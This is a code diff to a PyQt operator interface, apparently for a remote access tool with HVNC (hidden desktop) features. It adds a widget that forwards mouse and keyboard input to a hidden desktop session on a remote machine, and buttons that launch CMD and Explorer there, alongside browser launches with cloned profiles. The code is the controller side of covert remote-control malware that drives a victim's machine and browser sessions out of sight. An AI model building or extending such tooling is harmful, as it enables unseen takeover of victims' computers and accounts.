@@ -81,11 +81,203 @@ def build_session_url(
     return QtCore.QUrl(url)
 
 
+class HvncFrameWidget(QtWidgets.QLabel):
+    """Custom widget for displaying HVNC frames with mouse/keyboard input support.
+    
+    Captures mouse and keyboard events and forwards them to the HVNC session.
+    """
+    
+    # Signals to parent for input handling
+    mouse_move = QtCore.pyqtSignal(int, int)
+    mouse_down = QtCore.pyqtSignal(int, int, str)
+    mouse_up = QtCore.pyqtSignal(int, int, str)
+    mouse_scroll = QtCore.pyqtSignal(int, int, int, int)
+    key_down = QtCore.pyqtSignal(str)
+    key_up = QtCore.pyqtSignal(str)
+    text_input = QtCore.pyqtSignal(str)
+    
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setMouseTracking(True)
+        self.setFocusPolicy(QtCore.Qt.FocusPolicy.StrongFocus)
+        self.setCursor(QtCore.Qt.CursorShape.CrossCursor)
+        self.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
+        
+        # Desktop resolution (will be updated when frame received)
+        self._desktop_width = 1920
+        self._desktop_height = 1080
+        self._current_pixmap = None
+        self._pressed_keys = set()
+    
+    def set_desktop_size(self, width: int, height: int):
+        """Set the actual desktop resolution for coordinate scaling."""
+        self._desktop_width = width
+        self._desktop_height = height
+    
+    def _scale_coordinates(self, x: int, y: int) -> tuple[int, int]:
+        """Scale widget coordinates to desktop coordinates."""
+        if self._current_pixmap is None or self._current_pixmap.isNull():
+            return x, y
+        
+        # Get the actual pixmap display area
+        pw = self._current_pixmap.width()
+        ph = self._current_pixmap.height()
+        ww = self.width()
+        wh = self.height()
+        
+        # Calculate scaled size maintaining aspect ratio
+        scale = min(ww / pw, wh / ph) if pw > 0 and ph > 0 else 1
+        scaled_w = int(pw * scale)
+        scaled_h = int(ph * scale)
+        
+        # Calculate offset (centered)
+        offset_x = (ww - scaled_w) // 2
+        offset_y = (wh - scaled_h) // 2
+        
+        # Convert to pixmap coordinates
+        px = x - offset_x
+        py = y - offset_y
+        
+        # Scale to desktop coordinates
+        if scaled_w > 0 and scaled_h > 0:
+            dx = int(px * self._desktop_width / scaled_w)
+            dy = int(py * self._desktop_height / scaled_h)
+        else:
+            dx, dy = x, y
+        
+        # Clamp to desktop bounds
+        dx = max(0, min(self._desktop_width, dx))
+        dy = max(0, min(self._desktop_height, dy))
+        
+        return dx, dy
+    
+    def _button_name(self, button: QtCore.Qt.MouseButton) -> str:
+        """Convert Qt button to string name."""
+        if button == QtCore.Qt.MouseButton.LeftButton:
+            return "left"
+        elif button == QtCore.Qt.MouseButton.RightButton:
+            return "right"
+        elif button == QtCore.Qt.MouseButton.MiddleButton:
+            return "middle"
+        return "left"
+    
+    def setPixmap(self, pixmap: QtGui.QPixmap):
+        """Store pixmap for coordinate calculation."""
+        self._current_pixmap = pixmap
+        super().setPixmap(pixmap)
+    
+    def mouseMoveEvent(self, event: QtGui.QMouseEvent):
+        x, y = self._scale_coordinates(int(event.position().x()), int(event.position().y()))
+        self.mouse_move.emit(x, y)
+        super().mouseMoveEvent(event)
+    
+    def mousePressEvent(self, event: QtGui.QMouseEvent):
+        self.setFocus()
+        x, y = self._scale_coordinates(int(event.position().x()), int(event.position().y()))
+        button = self._button_name(event.button())
+        self.mouse_down.emit(x, y, button)
+        super().mousePressEvent(event)
+    
+    def mouseReleaseEvent(self, event: QtGui.QMouseEvent):
+        x, y = self._scale_coordinates(int(event.position().x()), int(event.position().y()))
+        button = self._button_name(event.button())
+        self.mouse_up.emit(x, y, button)
+        super().mouseReleaseEvent(event)
+    
+    def wheelEvent(self, event: QtGui.QWheelEvent):
+        x, y = self._scale_coordinates(int(event.position().x()), int(event.position().y()))
+        delta = event.angleDelta()
+        self.mouse_scroll.emit(x, y, delta.x(), delta.y())
+        super().wheelEvent(event)
+    
+    def keyPressEvent(self, event: QtGui.QKeyEvent):
+        if event.isAutoRepeat():
+            return
+        
+        # Handle printable characters
+        text = event.text()
+        if text and len(text) == 1 and text.isprintable():
+            modifiers = event.modifiers()
+            if not (modifiers & (QtCore.Qt.KeyboardModifier.ControlModifier | 
+                                 QtCore.Qt.KeyboardModifier.AltModifier |
+                                 QtCore.Qt.KeyboardModifier.MetaModifier)):
+                self.text_input.emit(text)
+                return
+        
+        # Handle special keys
+        key_name = self._key_to_name(event)
+        if key_name and key_name not in self._pressed_keys:
+            self._pressed_keys.add(key_name)
+            self.key_down.emit(key_name)
+    
+    def keyReleaseEvent(self, event: QtGui.QKeyEvent):
+        if event.isAutoRepeat():
+            return
+        
+        key_name = self._key_to_name(event)
+        if key_name and key_name in self._pressed_keys:
+            self._pressed_keys.discard(key_name)
+            self.key_up.emit(key_name)
+    
+    def focusOutEvent(self, event: QtGui.QFocusEvent):
+        # Release all keys when focus is lost
+        for key in list(self._pressed_keys):
+            self.key_up.emit(key)
+        self._pressed_keys.clear()
+        super().focusOutEvent(event)
+    
+    def _key_to_name(self, event: QtGui.QKeyEvent) -> str | None:
+        """Convert Qt key event to key name string."""
+        key_map = {
+            QtCore.Qt.Key.Key_Return: "Enter",
+            QtCore.Qt.Key.Key_Enter: "Enter",
+            QtCore.Qt.Key.Key_Tab: "Tab",
+            QtCore.Qt.Key.Key_Space: "Space",
+            QtCore.Qt.Key.Key_Backspace: "Backspace",
+            QtCore.Qt.Key.Key_Delete: "Delete",
+            QtCore.Qt.Key.Key_Insert: "Insert",
+            QtCore.Qt.Key.Key_Home: "Home",
+            QtCore.Qt.Key.Key_End: "End",
+            QtCore.Qt.Key.Key_PageUp: "PageUp",
+            QtCore.Qt.Key.Key_PageDown: "PageDown",
+            QtCore.Qt.Key.Key_Escape: "Escape",
+            QtCore.Qt.Key.Key_Up: "ArrowUp",
+            QtCore.Qt.Key.Key_Down: "ArrowDown",
+            QtCore.Qt.Key.Key_Left: "ArrowLeft",
+            QtCore.Qt.Key.Key_Right: "ArrowRight",
+            QtCore.Qt.Key.Key_Shift: "ShiftLeft",
+            QtCore.Qt.Key.Key_Control: "ControlLeft",
+            QtCore.Qt.Key.Key_Alt: "AltLeft",
+            QtCore.Qt.Key.Key_Meta: "MetaLeft",
+            QtCore.Qt.Key.Key_CapsLock: "CapsLock",
+            QtCore.Qt.Key.Key_F1: "F1", QtCore.Qt.Key.Key_F2: "F2",
+            QtCore.Qt.Key.Key_F3: "F3", QtCore.Qt.Key.Key_F4: "F4",
+            QtCore.Qt.Key.Key_F5: "F5", QtCore.Qt.Key.Key_F6: "F6",
+            QtCore.Qt.Key.Key_F7: "F7", QtCore.Qt.Key.Key_F8: "F8",
+            QtCore.Qt.Key.Key_F9: "F9", QtCore.Qt.Key.Key_F10: "F10",
+            QtCore.Qt.Key.Key_F11: "F11", QtCore.Qt.Key.Key_F12: "F12",
+        }
+        
+        key = event.key()
+        if key in key_map:
+            return key_map[key]
+        
+        # Letters
+        if QtCore.Qt.Key.Key_A <= key <= QtCore.Qt.Key.Key_Z:
+            return f"Key{chr(key)}"
+        
+        # Numbers
+        if QtCore.Qt.Key.Key_0 <= key <= QtCore.Qt.Key.Key_9:
+            return f"Digit{chr(key)}"
+        
+        return None
+
+
 class HvncViewWindow(QtWidgets.QWidget):
-    """Standalone window for viewing HVNC hidden desktop stream.
+    """Standalone window for viewing HVNC hidden desktop stream with input support.
     
     This window displays the hidden desktop video feed and provides
-    controls for interacting with the hidden desktop.
+    controls for interacting with the hidden desktop via mouse and keyboard.
     """
     closed = QtCore.pyqtSignal()
     
@@ -101,7 +293,7 @@ class HvncViewWindow(QtWidgets.QWidget):
         self.window_type = window_type
         self.parent_session = parent_session
         
-        title = "HVNC - Hidden Desktop" if window_type == "hidden" else "HVNC - Real Desktop"
+        title = "HVNC Desktop" if window_type == "hidden" else "Remote Desktop"
         self.setWindowTitle(f"{title} - {session_id[:8]}")
         self.setWindowFlag(QtCore.Qt.WindowType.Window)
         self.setAttribute(QtCore.Qt.WidgetAttribute.WA_DeleteOnClose, True)
@@ -110,6 +302,7 @@ class HvncViewWindow(QtWidgets.QWidget):
         
         self._setup_ui()
         self._apply_dark_theme()
+        self._connect_input_signals()
     
     def _setup_ui(self):
         layout = QtWidgets.QVBoxLayout(self)
@@ -124,7 +317,7 @@ class HvncViewWindow(QtWidgets.QWidget):
         header_layout.setContentsMargins(12, 0, 12, 0)
         
         title_label = QtWidgets.QLabel(
-            "🖥️ Hidden Desktop" if self.window_type == "hidden" else "🖥️ Real Desktop"
+            "🖥️ HVNC Desktop" if self.window_type == "hidden" else "🖥️ Remote Desktop"
         )
         title_label.setStyleSheet("font-weight: bold; font-size: 14px;")
         header_layout.addWidget(title_label)
@@ -136,19 +329,19 @@ class HvncViewWindow(QtWidgets.QWidget):
         header_layout.addStretch()
         layout.addWidget(header)
         
-        # Frame display area
+        # Frame display area with input support
         self.frame_container = QtWidgets.QWidget()
         self.frame_container.setStyleSheet("background-color: #000;")
         frame_layout = QtWidgets.QVBoxLayout(self.frame_container)
         frame_layout.setContentsMargins(0, 0, 0, 0)
         
-        self.frame_label = QtWidgets.QLabel()
-        self.frame_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
+        # Use custom frame widget with input support
+        self.frame_label = HvncFrameWidget()
         self.frame_label.setStyleSheet("background-color: #000;")
         self.frame_label.setMinimumSize(320, 240)
         
         # Placeholder text
-        self.frame_label.setText("Waiting for video stream...")
+        self.frame_label.setText("Waiting for video stream...\nClick here to enable input")
         self.frame_label.setStyleSheet("background-color: #000; color: #666; font-size: 16px;")
         
         frame_layout.addWidget(self.frame_label)
@@ -162,10 +355,13 @@ class HvncViewWindow(QtWidgets.QWidget):
         controls_layout.setContentsMargins(12, 8, 12, 8)
         
         # Browser launch buttons
-        for browser, icon in [("Chrome", "🌐"), ("Edge", "🌐"), ("Firefox", "🦊")]:
+        for browser, icon in [("Chrome", "🌐"), ("Edge", "🌐"), ("Firefox", "🦊"), ("CMD", "⬛"), ("Explorer", "📁")]:
             btn = QtWidgets.QPushButton(f"{icon} {browser}")
             btn.setFixedHeight(32)
-            btn.clicked.connect(lambda checked, b=browser.lower(): self._launch_browser(b))
+            if browser in ("CMD", "Explorer"):
+                btn.clicked.connect(lambda checked, b=browser.lower(): self._launch_app(b))
+            else:
+                btn.clicked.connect(lambda checked, b=browser.lower(): self._launch_browser(b))
             controls_layout.addWidget(btn)
         
         controls_layout.addStretch()
@@ -177,6 +373,61 @@ class HvncViewWindow(QtWidgets.QWidget):
         controls_layout.addWidget(close_btn)
         
         layout.addWidget(controls)
+    
+    def _connect_input_signals(self):
+        """Connect frame widget input signals to handlers."""
+        self.frame_label.mouse_move.connect(self._on_mouse_move)
+        self.frame_label.mouse_down.connect(self._on_mouse_down)
+        self.frame_label.mouse_up.connect(self._on_mouse_up)
+        self.frame_label.mouse_scroll.connect(self._on_mouse_scroll)
+        self.frame_label.key_down.connect(self._on_key_down)
+        self.frame_label.key_up.connect(self._on_key_up)
+        self.frame_label.text_input.connect(self._on_text_input)
+    
+    def _send_hvnc_control(self, control_type: str, **kwargs) -> None:
+        """Send HVNC control command via JavaScript."""
+        if not self.parent_session or not self.parent_session.view:
+            return
+        
+        payload = {"type": control_type, "hvnc": True, **kwargs}
+        payload_json = json.dumps(payload)
+        
+        script = f"""
+            if (window.remdesk && window.remdesk.hvnc) {{
+                window.remdesk.hvnc.sendAction('control', {payload_json});
+            }} else if (window.remdesk && window.remdesk.sendEncrypted) {{
+                window.remdesk.sendEncrypted({{action: 'hvnc_control', ...{payload_json}}});
+            }}
+        """
+        self.parent_session.view.page().runJavaScript(script)
+    
+    def _on_mouse_move(self, x: int, y: int) -> None:
+        """Handle mouse move event."""
+        self._send_hvnc_control("mouse_move", x=x, y=y)
+    
+    def _on_mouse_down(self, x: int, y: int, button: str) -> None:
+        """Handle mouse button press."""
+        self._send_hvnc_control("mouse_down", x=x, y=y, button=button)
+    
+    def _on_mouse_up(self, x: int, y: int, button: str) -> None:
+        """Handle mouse button release."""
+        self._send_hvnc_control("mouse_up", x=x, y=y, button=button)
+    
+    def _on_mouse_scroll(self, x: int, y: int, delta_x: int, delta_y: int) -> None:
+        """Handle mouse scroll."""
+        self._send_hvnc_control("mouse_scroll", x=x, y=y, delta_x=delta_x, delta_y=delta_y)
+    
+    def _on_key_down(self, key: str) -> None:
+        """Handle key press."""
+        self._send_hvnc_control("key_down", key=key)
+    
+    def _on_key_up(self, key: str) -> None:
+        """Handle key release."""
+        self._send_hvnc_control("key_up", key=key)
+    
+    def _on_text_input(self, text: str) -> None:
+        """Handle text input."""
+        self._send_hvnc_control("text_input", text=text)
     
     def _apply_dark_theme(self):
         self.setStyleSheet("""
@@ -250,6 +501,17 @@ class HvncViewWindow(QtWidgets.QWidget):
                         browser: '{browser}',
                         clone_profile: true
                     }});
+                }}
+            """
+            self.parent_session.view.page().runJavaScript(script)
+    
+    def _launch_app(self, app: str) -> None:
+        """Request app launch on hidden desktop (CMD, Explorer, etc.)."""
+        if self.parent_session and self.parent_session.view:
+            action = "launch_cmd" if app == "cmd" else "launch_explorer" if app == "explorer" else "launch_powershell"
+            script = f"""
+                if (window.remdesk && window.remdesk.hvnc) {{
+                    window.remdesk.hvnc.sendAction('{action}', {{}});
                 }}
             """
             self.parent_session.view.page().runJavaScript(script)
